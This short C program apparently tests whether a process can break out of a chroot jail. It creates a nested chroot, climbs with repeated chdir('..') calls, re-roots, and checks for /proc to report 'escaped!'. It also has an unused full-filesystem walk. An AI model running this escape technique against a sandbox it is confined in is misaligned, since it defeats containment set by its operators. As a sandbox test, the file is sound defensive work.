#define _XOPEN_SOURCE 500

#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <assert.h>
#include <ftw.h>
#include <errno.h>
#include <string.h>

#include <sys/mount.h>

void check_if_escaped() {
    // First we try to navigate to the real root and chroot there.
    {
        for (int i = 0; i < 32; ++i)
            chdir("..");

        {
            int retval = chroot(".");
            assert(retval == 0);
        }
    }

    // Since there is no '/proc' in the jail, this is enough to tell if we
    // escaped or not.
    {
        struct stat statbuf;
        if (stat("/proc", &statbuf) == 0) {
            printf("escaped!\n");
        } else {
            printf("did not escape!\n");
        }
    }
}

static int check_filesystem_access_helper(
    const char *fpath,
    const struct stat *sb,
    int typeflag,
    struct FTW *ftwbuf)
{
    printf(" %s\n", fpath);
    return 0;
}
void check_filesystem_access() {
    int retval = nftw("/", check_filesystem_access_helper, 0, 0);
    assert(retval == 0);
}

void test_method_0() {
}

void test_method_1() {
    {
        int retval = mkdir("foo", 0777);
        assert(retval == 0);
    }

    {
        int retval = chroot("foo");
        assert(retval == 0);
    }
}

int main(int argc, char **argv) {
    // check_filesystem_access();
    check_if_escaped();
}
